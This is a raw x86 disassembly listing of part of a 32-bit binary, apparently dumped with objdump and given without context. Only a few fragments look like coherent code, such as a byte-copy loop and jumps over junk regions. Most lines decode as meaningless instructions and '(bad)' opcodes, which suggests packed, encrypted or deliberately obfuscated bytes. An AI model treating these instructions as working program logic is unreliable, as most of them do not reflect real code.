  4072a1:	rcr    BYTE PTR [eax-0x2e],0xda
  4072a5:	push   esp
  4072a6:	dec    edx
  4072a7:	mov    dh,BYTE PTR [ebp-0x1a]
  4072aa:	adc    eax,0x256d6481
  4072af:	jp     0x40730b
  4072b1:	mov    dl,0x90
  4072b3:	popa   
  4072b4:	jp     0x4072f3
  4072b6:	fadd   st(2),st
  4072b8:	adc    ebx,esi
  4072ba:	or     al,0x86
  4072bc:	xchg   ebp,eax
  4072bd:	in     al,dx
  4072be:	mov    DWORD PTR [edi-0x6ab01c47],esp
  4072c4:	mov    DWORD PTR [edx],esp
  4072c6:	fldenv [edx-0xaa0e9ee]
  4072cc:	js     0x4072ff
  4072ce:	in     al,dx
  4072cf:	sbb    esi,ebx
  4072d1:	xor    ah,bl
  4072d3:	(bad)  
  4072d5:	mov    ebp,0xe3ea680a
  4072da:	jecxz  0x407310
  4072dc:	lock dec ecx
  4072de:	scas   al,BYTE PTR es:[edi]
  4072df:	mov    ah,0x70
  4072e1:	imul   edi,DWORD PTR [ebx-0x39],0x40
  4072e5:	les    esp,FWORD PTR [edi]
  4072e7:	push   ss
  4072e8:	(bad)  
  4072e9:	gs cdq 
  4072eb:	inc    ebx
  4072ec:	sub    eax,0xfd4277aa
  4072f1:	int3   
  4072f2:	inc    esp
  4072f3:	stos   BYTE PTR es:[edi],al
  4072f4:	in     eax,0x8d
  4072f6:	mov    esp,0x9b006952
  4072fb:	xchg   esp,eax
  4072fc:	mov    ecx,0xff082e62
  407301:	pop    eax
  407302:	or     eax,0x602b17fc
  407307:	xlat   BYTE PTR ds:[ebx]
  407308:	jmp    DWORD PTR [ecx+0x58]
  40730b:	sar    BYTE PTR [eax+0x305747f7],cl
  407311:	lea    eax,[esi+0x458bc215]
  407317:	clc    
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430546
  40732a:	sub    DWORD PTR ds:0x43049a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e762,0x4304aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4304b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x6702235c]
  40736c:	in     al,0x32
  40736e:	daa    
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x407371
  407378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407379:	gs jno 0x40730d
  40737c:	xor    al,0x27
  40737e:	outs   dx,DWORD PTR ds:[esi]
  40737f:	jae    0x407383
  407381:	xchg   ebx,eax
  407382:	lods   al,BYTE PTR ds:[esi]
  407383:	xchg   edi,eax
  407384:	dec    edx
  407385:	pop    ebx
  407386:	push   esp
  407387:	sahf   
  407388:	mov    ebp,0xfe21ffa4
  40738d:	sbb    bh,ch
  40738f:	imul   edi,DWORD PTR [esi+edi*4+0x6a61d163],0xffffffc4
  407397:	or     edi,DWORD PTR [edi+0x679d16b0]
  40739d:	sbb    BYTE PTR [eax-0x1f],cl
  4073a0:	jns    0x407389
  4073a2:	sub    al,0xb4
  4073a4:	xor    eax,0xe9eb0c27
  4073a9:	mov    ebx,0x9f6d1051
  4073ae:	jmp    0xdf781164
  4073b3:	add    ebx,edx
  4073b5:	sbb    dl,BYTE PTR [esi+0x2a]
  4073b8:	pop    edi
  4073b9:	cdq    
  4073ba:	dec    edi
  4073bb:	(bad)  
  4073bc:	push   ecx
  4073bd:	jl     0x40737c
  4073bf:	mov    ?,ebx
  4073c1:	xor    cl,BYTE PTR [edx]
  4073c3:	pusha  
  4073c4:	xchg   ecx,eax
  4073c5:	scas   eax,DWORD PTR es:[edi]
  4073c6:	aam    0x72
  4073c8:	cld    
  4073c9:	xchg   BYTE PTR [edi+0x63],dl
  4073cc:	pop    ebx
  4073cd:	outs   dx,DWORD PTR ds:[esi]
  4073ce:	xor    BYTE PTR ds:0x928b5950,al
  4073d4:	cld    
  4073d5:	loop   0x407409
  4073d7:	xchg   ecx,eax
  4073d8:	mov    dh,0xc
  4073da:	lods   eax,DWORD PTR ds:[esi]
  4073db:	and    BYTE PTR [ecx-0x3917bd55],ch
  4073e1:	loope  0x4073eb
  4073e3:	out    dx,al
  4073e4:	stos   DWORD PTR es:[edi],eax
  4073e5:	xchg   DWORD PTR [ebx-0x73],edi
  4073e8:	stos   BYTE PTR es:[edi],al
  4073e9:	dec    edx
  4073ea:	mov    ebx,0xdf85c1dd
  4073ef:	inc    eax
  4073f0:	fcomp  QWORD PTR [eax-0x2c19876b]
  4073f6:	pop    ebp
  4073f7:	test   DWORD PTR [esi],esi
  4073f9:	xor    BYTE PTR [edx+eax*4],bl
  4073fc:	and    al,0x53
  4073fe:	fsubr  DWORD PTR [ebx-0x3ccd1c24]
  407404:	arpl   WORD PTR [ebp-0x137ce489],bx
  40740a:	retf   
  40740b:	fmul   st(3),st
  40740d:	repnz xchg esp,eax
  40740f:	out    0xc0,al
  407411:	idiv   dh
  407413:	and    DWORD PTR [ebx+0x1a],esi
  407416:	sub    DWORD PTR [edi],edx
  407418:	xchg   ebx,eax
  407419:	dec    eax
  40741a:	mov    bl,0xaf
  40741c:	mov    bl,ch
  40741e:	arpl   WORD PTR [ebx],bx
  407420:	and    esp,edx
  407422:	int3   
  407423:	inc    edx
  407424:	out    dx,al
  407425:	mov    edx,0xc8c7a352
  40742a:	ins    BYTE PTR es:[edi],dx
  40742b:	push   esp
  40742c:	shr    BYTE PTR [ebp+0x7c],cl
  40742f:	push   ebp
  407430:	lods   eax,DWORD PTR ds:[esi]
  407431:	and    ebp,DWORD PTR [esi-0x72223865]
  407437:	xchg   ecx,eax
  407438:	jns    0x407407
  40743a:	cmp    esi,esp
  40743c:	loopne 0x4073e9
  40743e:	popf   
  40743f:	jb     0x40745a
  407441:	mov    al,ds:0xb655e28
  407446:	dec    edi
  407447:	jbe    0x40741a
  407449:	and    DWORD PTR [ebx],ecx
  40744b:	fstp   DWORD PTR [ebp-0x7]
  40744e:	push   ebx
  40744f:	push   ecx
  407450:	sub    bh,BYTE PTR [eax]
  407452:	push   eax
  407453:	or     al,0x36
  407455:	push   ebx
  407456:	mov    ch,0xae
  407458:	mov    dl,0xfc
  40745a:	dec    ecx
  40745b:	dec    eax
  40745c:	scas   eax,DWORD PTR es:[edi]
  40745d:	push   esp
  40745e:	retf   0x7a90
  407461:	mov    al,0x8e
  407463:	jb     0x407408
  407465:	add    edi,DWORD PTR [eax*8-0x661d04cf]
  40746c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40746d:	sub    DWORD PTR [edi+edx*1],edx
  407470:	int    0xcf
  407472:	add    DWORD PTR [edi-0x66c3cc30],esi
  407478:	in     eax,dx
  407479:	test   eax,0x48803cb9
  40747e:	sbb    BYTE PTR [ebp-0x2f],0x16
  407482:	lahf   
  407483:	std    
  407484:	xchg   edx,eax
  407485:	dec    ebp
  407486:	int    0xe6
  407488:	repz jl 0x4074dd
  40748b:	jo     0x407492
  40748d:	dec    ebx
  40748e:	cmp    BYTE PTR [ecx-0x41],0x8d
  407492:	xor    dh,BYTE PTR [edx-0x7110e174]
  407498:	sbb    bl,al
  40749a:	aaa    
  40749b:	shr    ebp,1
  40749d:	enter  0x3f75,0xc1
  4074a1:	ret    0x6eb3
  4074a4:	add    DWORD PTR [eax-0x5d964680],ecx
  4074aa:	push   ebp
  4074ab:	mov    ecx,0x5eeb26be
  4074b0:	inc    ecx
  4074b1:	(bad)  
  4074b2:	xchg   ecx,eax
  4074b3:	ss push ebp
  4074b5:	popa   
  4074b6:	into   
  4074b7:	mov    ds:0x6b7ea97d,eax
  4074bc:	lock and bl,ch
  4074bf:	dec    esi
  4074c0:	sub    al,0x14
  4074c2:	mov    esi,0x47ba3766
  4074c7:	mov    ds:0x1f0cf36,eax
  4074cc:	mov    al,cl
  4074ce:	iret   
  4074cf:	pushf  
  4074d0:	pop    es
  4074d1:	sti    
  4074d2:	mov    eax,0x859221fa
  4074d7:	dec    esi
  4074d8:	std    
  4074d9:	icebp  
  4074da:	cld    
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	pushf  
  40750a:	mov    bl,0x5d
  40750c:	and    ebp,ebp
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x4074ce
  407516:	jbe    0x407508
  407518:	aad    0xa2
  40751a:	cmp    eax,0x6c47fcac
  40751f:	fisub  DWORD PTR [ebx]
  407521:	sbb    eax,0x17190518
  407526:	inc    eax
  407527:	es popa 
  407529:	ins    BYTE PTR es:[edi],dx
  40752a:	sbb    eax,0x8eee7f84
  40752f:	sub    al,0xd8
  407531:	iret   
  407532:	ret    0x776d
  407535:	and    DWORD PTR [edx-0x70],0xffffffcf
  407539:	mov    dh,0xb0
  40753b:	push   edi
  40753c:	clc    
  40753d:	dec    esi
  40753e:	push   esp
  40753f:	adc    DWORD PTR [eax+0x70],edi
  407542:	dec    ebx
  407543:	(bad)  
  407544:	jne    0x40758b
  407546:	loop   0x4075aa
  407548:	pusha  
  407549:	outs   dx,DWORD PTR ds:[esi]
  40754a:	xchg   ecx,eax
  40754b:	add    esi,0xffffff8f
  40754e:	cmp    esp,DWORD PTR ds:0xdfebd1cb
  407554:	cs (bad) 
  407557:	inc    ecx
  407558:	mov    WORD PTR [ebx-0x74],?
  40755b:	aaa    
  40755c:	xor    eax,0xe5156d9e
  407561:	ins    DWORD PTR es:[edi],dx
  407562:	sub    DWORD PTR [eax+edx*4],ebx
  407565:	cmp    eax,0x5cb16375
  40756a:	xor    al,0x4e
  40756c:	jge    0x407512
  40756e:	cmc    
  40756f:	add    al,BYTE PTR [esi-0x692c8607]
  407575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407576:	jae    0x407582
  407578:	xor    esi,ebx
  40757a:	mov    al,0x9c
  40757c:	mov    ebp,ebx
  40757e:	adc    BYTE PTR [ebp+0x2a],0xd6
  407582:	jb     0x407541
  407584:	fisttp QWORD PTR [edx-0x5228cfde]
  40758a:	scas   eax,DWORD PTR es:[edi]
  40758b:	push   esi
  40758c:	mov    edx,0x43a96a3e
  407591:	test   DWORD PTR [esi+0x9b1577d],edi
  407597:	int3   
  407598:	hlt    
  407599:	xchg   edi,eax
  40759a:	imul   ebp,DWORD PTR [edx-0x12873069],0x4356a976
  4075a4:	jne    0x4075ff
  4075a6:	cmp    eax,0x4c7bf387
  4075ab:	mov    ecx,DWORD PTR [eax]
  4075ad:	adc    DWORD PTR [ecx],edx
  4075af:	mov    ah,0x73
  4075b1:	shl    ah,0xfa
  4075b4:	in     al,0x9f
  4075b6:	into   
  4075b7:	xchg   eax,esp
  4075b9:	daa    
  4075ba:	fstp   QWORD PTR [eax-0x46]
  4075bd:	mov    ecx,0xe7ced015
  4075c2:	ja     0x4075a7
  4075c4:	imul   ecx,DWORD PTR [ecx+edi*2],0xae605376
  4075cb:	lods   eax,DWORD PTR ds:[esi]
  4075cc:	jo     0x407604
  4075ce:	and    BYTE PTR [ebp-0x65451ddc],al
  4075d4:	fs cld 
  4075d6:	(bad)  
  4075d7:	jbe    0x4075ac
  4075d9:	pop    ebp
  4075da:	loope  0x407641
  4075dc:	cld    
  4075dd:	push   ecx
  4075de:	fadd   QWORD PTR [ebp-0x16]
  4075e1:	leave  
  4075e2:	(bad)  
  4075e3:	xchg   edx,eax
  4075e4:	fidivr DWORD PTR [eax+0xd35f1]
  4075ea:	cmp    DWORD PTR [ebx+0x4a],ecx
  4075ed:	mov    ah,0x27
  4075ef:	mov    al,ds:0x58c59b7a
  4075f4:	pushf  
  4075f5:	scas   al,BYTE PTR es:[edi]
  4075f6:	dec    ebp
  4075f7:	mul    BYTE PTR ss:[ebx-0x70a6abd5]
  4075fe:	ret    
  4075ff:	cmp    DWORD PTR [edi-0x5fbf1d2],0x2a
  407606:	stos   BYTE PTR es:[edi],al
  407607:	jnp    0x407664
  407609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40760a:	sub    BYTE PTR [ebp-0x7b2a1657],0x73
  407611:	stos   BYTE PTR es:[edi],al
  407612:	and    ebp,ecx
  407614:	and    ch,dh
  407616:	inc    esp
  407617:	aad    0x31
  407619:	cmp    eax,0x9f70d8b2
  40761e:	mov    ch,0x95
  407620:	cmp    eax,0xf74c606f
  407625:	push   ds
  407626:	push   edi
  407627:	jnp    0x407641
  407629:	push   ds
  40762a:	in     al,dx
  40762b:	popa   
  40762c:	xchg   ebx,eax
  40762d:	mov    bl,0x81
  40762f:	leave  
  407630:	push   ebp
  407631:	mov    DWORD PTR [esi-0x2d900d25],ebx
  407637:	cmc    
  407638:	push   eax
  407639:	push   0x7ecbfede
  40763e:	cmp    al,0x49
  407640:	cmc    
  407641:	fwait
  407642:	xchg   esp,eax
  407643:	je     0x407669
  407645:	sar    BYTE PTR [esi+esi*2+0x26],cl
  407649:	neg    DWORD PTR [esi+0x1e]
  40764c:	add    BYTE PTR [eax],dl
  40764e:	push   cs
  40764f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407650:	pop    ecx
  407651:	pushf  
  407652:	mov    ecx,0x6124f639
  407657:	gs jo  0x407634
  40765a:	or     eax,0x33d7ec82
  40765f:	mov    dh,0xf9
  407661:	in     eax,dx
  407662:	ds sbb al,0xe7
  407665:	ds out dx,al
  407667:	test   al,0xe0
  407669:	pushf  
  40766a:	bound  ecx,QWORD PTR [ebx-0x58476cb9]
  407670:	pop    ss
  407671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407672:	sub    al,0xff
  407674:	xor    edi,DWORD PTR [ebx-0x7]
  407677:	pand   mm1,QWORD PTR [ebx+0x7ce9087d]
  40767e:	add    DWORD PTR [eax],eax
  407680:	add    BYTE PTR [ebx-0x15],dh
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	scas   eax,DWORD PTR es:[edi]
  40768e:	jmp    0x7e7e:0xc141c951
  407695:	sar    BYTE PTR [edi+0x7e],cl
  407698:	jle    0x407666
  40769a:	dec    ebx
  40769b:	xchg   edx,eax
  40769c:	xor    edi,DWORD PTR [edx]
  40769e:	dec    cl
  4076a0:	pop    edi
  4076a1:	push   edi
  4076a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a3:	dec    edi
  4076a4:	xchg   esp,eax
  4076a5:	pop    eax
  4076a6:	add    ah,cl
  4076a8:	xchg   ebp,eax
  4076a9:	xor    ch,BYTE PTR [ebx+0x2]
  4076ac:	xchg   edx,eax
  4076ad:	jo     0x407632
  4076af:	ss dec esp
  4076b1:	aam    0x2d
  4076b3:	mov    ebx,0xf1cc1f81
  4076b8:	mov    ch,0x8
  4076ba:	sub    BYTE PTR [eax],dh
  4076bc:	(bad)  
  4076bd:	aad    0x1b
  4076bf:	int    0x7f
  4076c1:	loop   0x407695
  4076c3:	in     al,dx
  4076c4:	pusha  
  4076c5:	je     0x407726
  4076c7:	repnz ins BYTE PTR es:[edi],dx
  4076c9:	xchg   ecx,eax
  4076ca:	out    dx,eax
  4076cb:	sar    BYTE PTR ds:0xd0f57573,1
  4076d1:	cwde   
  4076d2:	mov    bh,0x41
  4076d4:	(bad)  
  4076d5:	out    dx,al
  4076d6:	cmp    eax,ecx
  4076d8:	lahf   
  4076d9:	jb     0x40768e
  4076db:	jns    0x4076ec
  4076dd:	das    
  4076de:	nop
  4076df:	shl    BYTE PTR [edi+0x7e],0x27
  4076e3:	pop    edi
  4076e4:	(bad)  
  4076e5:	call   0xd2f727ea
  4076ea:	mov    bl,0x3a
  4076ec:	mov    esi,0x8a80074a
  4076f1:	or     edi,ebx
  4076f3:	fwait
  4076f4:	sub    cl,BYTE PTR [esp+ebx*2+0x79404b20]
  4076fb:	jnp    0x4076e8
  4076fd:	out    dx,eax
  4076fe:	mov    dl,0x33
  407700:	inc    ecx
  407701:	push   0xebcc460c
  407706:	push   esp
  407707:	(bad)  
  407708:	call   0x441cef17
  40770d:	jmp    0xbe071f40
  407712:	jmp    0xce07b25c
  407717:	adc    BYTE PTR [ecx-0x49],0x5
  40771b:	retf   0x4691
  40771e:	and    al,0xe7
  407720:	sbb    edx,esi
  407722:	leave  
  407723:	mov    cl,0x23
  407725:	pop    es
  407726:	(bad)
  407729:	ja     0x40778c
  40772b:	xor    dl,dl
  40772d:	lahf   
  40772e:	mov    ds:0xa6bd13e9,al
  407733:	dec    ecx
  407734:	mov    esp,0x20d0cfb2
  407739:	adc    DWORD PTR [ebx],eax
  40773b:	inc    edx
  40773c:	fsubr  DWORD PTR [esi]
  40773e:	xchg   BYTE PTR [ebx],dl
  407740:	cmp    ebx,DWORD PTR [ebx+ebx*8+0x3f0ac428]
  407747:	and    bh,ch
  407749:	(bad)  
  40774a:	fucomi st,st(2)
  40774c:	mov    ah,0x3f
  40774e:	jecxz  0x40773e
  407750:	aas    
  407751:	sbb    DWORD PTR [edi+0x13],eax
  407754:	mov    ds,ebp
  407756:	add    al,BYTE PTR [eax]
  407758:	and    al,0xce
  40775a:	sbb    al,0xbf
  40775c:	mov    ebx,0xe3d4a848
  407761:	jnp    0x4077e1
  407763:	mov    WORD PTR [eax+0x232c0e99],cs
  407769:	mov    ds:0xeaf744de,al
  40776e:	imul   edx,DWORD PTR [ebx+ebx*2],0x1b9f314
  407775:	or     DWORD PTR [edx-0x3dc09e1d],ebx
  40777b:	mov    ecx,0xef20423c
  407780:	bound  edx,QWORD PTR [esi-0x329a7ff7]
  407786:	jmp    0xbcfde94b
  40778b:	hlt    
  40778c:	xor    dl,bh
  40778e:	or     al,0x24
  407790:	cdq    
  407791:	inc    esi
  407792:	aas    
  407793:	sbb    DWORD PTR [ecx],0xae9ca877
  407799:	inc    eax
  40779a:	jmp    0x77503d24
  40779f:	in     eax,0x7a
  4077a1:	test   eax,0x58197ce2
  4077a6:	jl     0x407788
  4077a8:	imul   BYTE PTR [ecx-0x4d5b9658]
  4077ae:	imul   esp,DWORD PTR [edx+0x74],0xffffffe2
  4077b2:	rcr    DWORD PTR [edx+0x46],0x8a
  4077b6:	ret    0xf22
  4077b9:	push   ds
  4077ba:	mov    esp,0xeeeca77a
  4077bf:	xchg   BYTE PTR [ecx+0x3b],bl
  4077c2:	pop    es
  4077c3:	mov    ecx,0xbae3d9c6
  4077c8:	leavew 
  4077ca:	mov    eax,0xf2af40b9
  4077cf:	pop    esp
  4077d0:	adc    eax,0xf9d150d2
  4077d5:	inc    edi
  4077d6:	pop    ss
  4077d7:	or     DWORD PTR [eax-0x1b],0xffffffb4
  4077db:	cld    
  4077dc:	inc    ecx
  4077dd:	lods   al,BYTE PTR ds:[esi]
  4077de:	adc    al,0x3d
  4077e0:	inc    esp
  4077e1:	add    edx,esp
  4077e3:	dec    edi
  4077e4:	inc    eax
  4077e5:	pop    ecx
  4077e6:	test   eax,0x76cee3a
  4077eb:	ja     0x407778
  4077ed:	mov    esi,0xb2dc7ddc
  4077f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f3:	xor    BYTE PTR [ebx-0x33],dl
  4077f6:	shl    BYTE PTR [ecx+0x58],1
  4077f9:	mov    esi,0xb8fecb92
  4077fe:	inc    eax
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	push   ecx
  407821:	xchg   ecx,eax
  407822:	jne    0x407864
  407824:	and    eax,0xd27e7ec3
  407829:	jg     0x4078a9
  40782b:	jle    0x407810
  40782d:	(bad)
  407831:	cmc    
  407832:	sti    
  407833:	or     al,0x35
  407835:	outs   dx,DWORD PTR ds:[esi]
  407836:	sti    
  407837:	dec    edi
  407838:	mov    ebx,edi
  40783a:	jne    0x407812
  40783c:	gs mov es,ecx
  40783f:	jle    0x407805
  407841:	dec    esp
  407842:	xor    edx,DWORD PTR [edx]
  407844:	mov    bl,0xcb
  407846:	dec    edi
  407847:	ds (bad) 
  407849:	pop    edx
  40784a:	jbe    0x4078a9
  40784c:	inc    esp
  40784d:	mov    bl,0xb2
  40784f:	nop
  407850:	add    BYTE PTR [ebp+ebx*1+0x2b],0x73
  407855:	mov    esi,0xf36ffaeb
  40785a:	pop    ecx
  40785b:	sbb    al,0xa4
  40785d:	(bad)  
  40785e:	daa    
  40785f:	js     0x4078d9
  407861:	shr    WORD PTR [esi+0x3566799e],0x94
  407869:	hlt    
  40786a:	add    ebp,ebx
  40786c:	retf   0x5dc1
  40786f:	mov    bh,0x57
  407871:	sbb    eax,0x5b5f3590
  407876:	sbb    bl,BYTE PTR [eax-0x45ff5429]
  40787c:	repz push ds
  40787e:	push   eax
  40787f:	cld    
  407880:	dec    esi
  407881:	mov    al,0x46
  407883:	sub    dl,BYTE PTR [edi]
  407885:	xchg   BYTE PTR [eax+0xe],ah
  407888:	sub    DWORD PTR [edi-0xb],esp
  40788b:	xor    bh,bl
  40788d:	jnp    0x4078ac
  40788f:	mov    ecx,0xde976aac
  407894:	push   ecx
  407895:	or     al,0xd2
  407897:	and    eax,0xe3559fbc
  40789c:	aas    
  40789d:	retf   0xcae1
  4078a0:	leave  
  4078a1:	addr16 jp 0x407832
  4078a4:	leave  
  4078a5:	repnz popa 
  4078a7:	mov    edi,0x9fca5c5f
  4078ac:	or     al,0x7f
  4078ae:	inc    edx
  4078af:	xor    eax,0x819accb8
  4078b4:	sub    al,0xc2
  4078b6:	(bad)  
  4078b7:	lock in eax,dx
  4078b9:	inc    ebx
  4078ba:	(bad)  
  4078bb:	push   edi
  4078bc:	or     cl,BYTE PTR [eax-0x2]
  4078bf:	jo     0x4078e9
  4078c1:	lods   al,BYTE PTR ds:[esi]
  4078c2:	pusha  
  4078c3:	scas   eax,DWORD PTR es:[edi]
  4078c4:	loopne 0x407932
  4078c6:	xor    dh,BYTE PTR [edi-0x1f513396]
  4078cc:	out    dx,eax
  4078cd:	sbb    al,0x15
  4078cf:	xor    al,0x72
  4078d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d2:	call   0xb58:0xc9710ed
  4078d9:	push   esp
  4078da:	jle    0x407929
  4078dc:	mov    esi,0x717ec82
  4078e1:	hlt    
  4078e2:	stos   BYTE PTR es:[edi],al
  4078e3:	xchg   ecx,eax
  4078e4:	mov    eax,ds:0x9f736c63
  4078e9:	sbb    al,BYTE PTR [eax]
  4078eb:	in     al,0x74
  4078ed:	in     eax,0x2d
  4078ef:	hlt    
  4078f0:	add    BYTE PTR ds:0x7a08dbf8,bl
  4078f6:	dec    ecx
  4078f7:	pop    esi
  4078f8:	(bad)  
  4078f9:	dec    eax
  4078fa:	xor    eax,DWORD PTR ds:0x995b7f39
  407900:	aaa    
  407901:	pop    edx
  407902:	in     eax,0x3d
  407904:	jecxz  0x4078c6
  407906:	retf   
  407907:	test   al,0x99
  407909:	mov    eax,ds:0xf263a5cc
  40790e:	cmp    ecx,ebx
  407910:	das    
  407911:	iret   
  407912:	pop    edx
  407913:	add    eax,0x62f83107
  407918:	mov    edi,0xf675e3b6
  40791d:	dec    edx
  40791e:	adc    bh,BYTE PTR [esi+0x4]
  407921:	sub    al,0xbc
  407923:	mov    BYTE PTR [ecx+0x2d],al
  407926:	test   DWORD PTR [esi-0x36],esi
  407929:	inc    eax
  40792a:	aaa    
  40792b:	dec    edx
  40792c:	fcom   DWORD PTR [ecx+0x3f]
  40792f:	into   
  407930:	cmp    DWORD PTR [ecx],ebp
  407932:	dec    cx
  407934:	adc    ecx,edx
  407936:	leave  
  407937:	fwait
  407938:	out    dx,al
  407939:	pop    ebx
  40793a:	cmovbe eax,esp
  40793d:	fst    QWORD PTR [esi+esi*2]
  407940:	cwde   
  407941:	loopne 0x407920
  407943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407944:	pop    ebx
  407945:	add    al,0x10
  407947:	int3   
  407948:	pop    edi
  407949:	lock retf 
  40794b:	jnp    0x407902
  40794d:	test   al,0xb6
  40794f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407950:	(bad)  
  407951:	cmp    BYTE PTR [esi+esi*4+0x58],ah
  407955:	ja     0x4079c9
  407957:	out    0xd2,eax
  407959:	retf   0xb0a9
  40795c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40795d:	into   
  40795e:	inc    ebp
  40795f:	les    eax,FWORD PTR [esi-0x525bc46f]
  407965:	xchg   DWORD PTR [edi],ebp
  407967:	pop    ebx
  407968:	jnp    0x407977
  40796a:	adc    ch,cl
  40796c:	push   edx
  40796d:	sbb    al,0x7e
  40796f:	int3   
  407970:	push   es
  407971:	test   BYTE PTR [ecx],bl
  407973:	lahf   
  407974:	hlt    
  407975:	dec    eax
  407976:	xor    eax,0x4ee97e5a
  40797b:	pop    ebp
  40797c:	sub    ebp,edx
  40797e:	ja     0x4079d8
  407980:	mov    esp,0x18c5f547
  407985:	out    dx,eax
  407986:	xchg   esi,eax
  407987:	in     al,0x43
  407989:	(bad)  
  40798a:	ins    BYTE PTR es:[edi],dx
  40798b:	das    
  40798c:	rol    al,0x69
  40798f:	ret    
  407990:	movzx  eax,ax
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	push   0x99151f14
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x407a19
  4079b4:	xchg   BYTE PTR [ebp-0x51180ecc],cl
  4079ba:	sub    BYTE PTR [ebx+0x3322764f],0xb5
  4079c1:	(bad)  
  4079c2:	xlat   BYTE PTR ds:[ebx]
  4079c3:	pusha  
  4079c4:	test   BYTE PTR [esi],cl
  4079c6:	cmc    
  4079c7:	cdq    
  4079c8:	data16 loop 0x40794e
  4079cb:	push   ebp
  4079cc:	sbb    DWORD PTR [eax+0x4d],eax
  4079cf:	or     al,0xa8
  4079d1:	std    
  4079d2:	arpl   WORD PTR [ecx-0x75a1888e],cx
  4079d8:	or     bh,BYTE PTR [ebx-0x5]
  4079db:	xor    DWORD PTR [ecx-0x15c6535e],esp
  4079e1:	jg     0x4079ef
  4079e3:	pushf  
  4079e4:	cmc    
  4079e5:	and    eax,DWORD PTR [esi+0x5e1660b5]
  4079eb:	jge    0x4079ac
  4079ed:	retf   0x1ecb
  4079f0:	dec    ebp
  4079f1:	inc    ebp
  4079f2:	mov    ch,0x86
  4079f4:	mov    DWORD PTR [ebx],eax
  4079f6:	fsub   DWORD PTR [edi]
  4079f8:	(bad)  
  4079f9:	lds    edi,FWORD PTR [esi+edx*2-0x424b4ab3]
  407a00:	addr16 retf 
  407a02:	ds inc ecx
  407a04:	(bad)  
  407a06:	sub    DWORD PTR [eax-0x70],0xffffffbd
  407a0a:	lds    ebp,FWORD PTR [esp+edx*1]
  407a0d:	add    al,0x15
  407a0f:	jl     0x407a7f
  407a11:	jge    0x407a7d
  407a13:	pop    ebx
  407a14:	lea    esp,[edi+0x47198a92]
  407a1a:	adc    DWORD PTR [eax+0x2076104d],ecx
  407a20:	loop   0x407a44
  407a22:	jmp    0x4079c3
  407a24:	clc    
  407a25:	pusha  
  407a26:	ret    0xe4d0
  407a29:	cli    
  407a2a:	pop    ebx
  407a2b:	das    
  407a2c:	xor    al,0x62
  407a2e:	jge    0x407a66
  407a30:	mov    BYTE PTR [edx],bh
  407a32:	fs je  0x407a33
  407a35:	adc    eax,0xf1718640
  407a3a:	fcmovne st,st(6)
  407a3c:	out    0xef,al
  407a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a3f:	jmp    0xef3d9608
  407a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a45:	mov    DWORD PTR [ebx+edi*1+0x2f],edi
  407a49:	ja     0x407a42
  407a4b:	in     al,dx
  407a4c:	ret    0x308
  407a4f:	xchg   esp,eax
  407a50:	xchg   DWORD PTR ds:0xe26b2435,esi
  407a56:	jo     0x407a47
  407a58:	aad    0x4
  407a5a:	test   BYTE PTR [edi+0x4b],cl
  407a5d:	pop    es
  407a5e:	cmp    BYTE PTR [ebp+ebp*1-0x30],dl
  407a62:	aad    0x7e
